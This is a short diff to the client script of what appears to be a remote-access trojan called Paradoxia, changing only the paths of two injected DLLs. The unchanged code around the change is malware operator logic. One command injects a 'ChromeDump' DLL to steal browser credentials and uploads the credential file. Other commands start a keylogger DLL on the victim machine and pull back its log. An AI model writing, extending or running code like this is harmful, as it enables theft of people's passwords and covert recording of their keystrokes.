@@ -389,7 +389,7 @@ class ParadoxiaClient:
                     self.WaitForReply()
 
                 elif(main == "chromedump"):
-                    DLLTransfer("chrome.dll") # Inject ChromeDump.dll
+                    DLLTransfer("dlls/chrome.dll") # Inject ChromeDump.dll
                     time.sleep(2)
                     credfile = hostList[location].split("/")[0].strip()
                     self.SendData("fupload:"+credfile)
@@ -402,7 +402,7 @@ class ParadoxiaClient:
                     print(Style.BRIGHT + Fore.LIGHTWHITE_EX + "[+] Saved in 'downloads/"+credfile+"'")
 
                 elif(main == "keylog_start"):
-                    DLLTransfer("keylogger.dll")
+                    DLLTransfer("dlls/keylogger.dll")
                 
                 elif(main == "keylog_dump"):
                     self.SendData("fupload:log.log")
